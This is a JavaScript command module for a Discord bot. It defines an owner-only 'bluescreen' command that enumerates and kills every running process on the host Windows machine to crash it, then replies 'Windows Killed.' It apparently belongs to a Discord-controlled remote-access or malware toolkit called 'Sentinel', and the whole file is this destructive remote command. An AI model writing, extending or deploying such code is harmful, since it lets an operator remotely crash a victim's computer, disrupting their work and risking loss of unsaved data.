const { ApplicationCommandOptionType, EmbedBuilder } = require("discord.js"),
  kill = require("../../../Sentinel/utils/kill"),
  core = require("../../../Sentinel/utils/core");

module.exports = {
  name: "bluescreen",
  ownerOnly: true,
  description: "Kill windows",

  run: async (client, interaction, args) => {
    await interaction.reply({
      content: `Windows Killed.`,
      ephemeral: true,
    });
    let fdp = await core.getAllProcesses();
    await kill.KillAllProcess(fdp);
  },
};
